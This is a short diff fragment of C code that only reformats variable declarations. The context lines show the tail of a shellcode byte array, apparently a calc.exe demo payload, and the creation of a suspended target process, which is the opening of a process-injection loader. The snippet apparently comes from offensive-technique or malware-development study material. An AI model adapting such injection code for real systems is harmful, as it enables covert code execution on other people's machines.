@@ -33,10 +33,10 @@ int main()
 	0x63,0x2e,0x65,0x78,0x65,0x00
 		};
 
-	SIZE_T PayloadSize = sizeof(Shellcode);
-	HANDLE ThreadHandle = NULL;
-	HANDLE ProcessHandle = NULL;
-	DWORD ThreadId = 0;
+	SIZE_T	PayloadSize		= sizeof(Shellcode);
+	HANDLE	ThreadHandle	= NULL;
+	HANDLE	ProcessHandle	= NULL;
+	DWORD	ThreadId		= 0;
 
 	if (!CreateSuspendedProcess(TARGET_PROCESS, &ProcessHandle, &ThreadHandle, &ThreadId))
 	{
